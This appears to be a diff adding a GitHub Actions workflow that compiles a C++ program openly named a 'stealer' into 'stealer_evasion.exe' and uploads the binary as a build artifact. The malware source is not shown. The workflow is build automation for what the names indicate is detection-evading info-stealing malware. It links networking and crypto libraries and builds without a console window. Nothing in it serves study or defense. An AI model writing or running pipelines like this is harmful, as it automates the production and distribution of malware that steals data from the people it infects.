@@ -1,0 +1,23 @@
+name: Build Evasion Stealer
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup MSVC
+        uses: ilammy/msvc-dev-cmd@v1
+        
+      - name: Compile stealer
+        run: |
+          cl /O2 /std:c++latest stealer_simple.cpp /link /SUBSYSTEM:WINDOWS ws2_32.lib wininet.lib crypt32.lib advapi32.lib /OUT:stealer_evasion.exe
+          
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: stealer-build
+          path: stealer_evasion.exe
+          
